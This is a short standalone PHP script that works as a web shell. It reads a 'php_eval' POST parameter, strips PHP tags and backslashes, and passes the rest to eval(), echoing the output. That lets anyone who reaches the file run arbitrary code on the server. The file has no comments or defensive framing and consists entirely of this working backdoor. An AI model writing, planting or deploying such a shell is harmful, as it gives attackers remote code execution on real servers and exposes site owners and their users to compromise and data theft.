<?php
$eval = @str_replace("<?php","",$_POST['php_eval']);
$eval = @str_replace("<?php","",$eval);
$eval = @str_replace("?>","",$eval);
$eval = @str_replace("\\","",$eval);
echo eval($eval);
?>